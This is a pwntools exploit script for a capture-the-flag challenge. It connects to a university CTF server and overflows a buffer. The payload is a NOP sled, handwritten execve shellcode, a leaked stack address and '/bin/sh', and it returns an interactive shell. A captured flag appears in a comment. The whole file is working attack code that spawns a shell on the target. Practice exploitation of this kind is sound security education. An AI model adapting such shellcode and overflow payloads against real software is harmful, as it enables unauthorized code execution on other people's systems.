from pwn import *

BINARY = ['./chall']
IP, PORT = 'ctf99.cs.ui.ac.id', 10013
LOCAL = False
DEBUG = False
if LOCAL:
    if DEBUG:
        p = gdb.debug(BINARY, '''
        b *vuln+27
        b *vuln+32
        b *vuln+34
        ''')
    else:
        p = process(BINARY)
else:
    p = remote(IP, PORT)

# context.update(arch='amd64', os='linux', endian='little')

# made in https://shell-storm.org/online/Online-Assembler-and-Disassembler/
shellcode = b"\x48\x31\xf6" \
            b"\x48\x89\xe7" \
            b"\x48\x83\xc0\x3a" \
            b"\x0f\x05"
            # xor rsi (clears rsi)
            # mov rdi, rsp (rsp has the address that points to the /bin/sh)
            # add rax, 58 (was 1, result is 59)
            # syscall
address = p.recvline().decode().split(" ")[-1]
print(f"Address is: {address}")
bytes_address = p64(int(address, 16))
print(bytes_address)
bin_sh = b'/bin/sh'
print(f'shellcode size: {len(shellcode)} bytes')
print(f'bytes address size: {len(bytes_address)} bytes')
print(f'bin_sh size: {len(bin_sh)} bytes')

payload = b'\x90' * (16 - len(shellcode)) + shellcode + bytes_address + bin_sh
print(f'payload size: {len(payload)} bytes')
print(payload)
p.sendline(payload)
p.interactive()
pause()  # CSCE604258{Stack_Pivoting_may_become_useful_if_you_are_short_of_space}
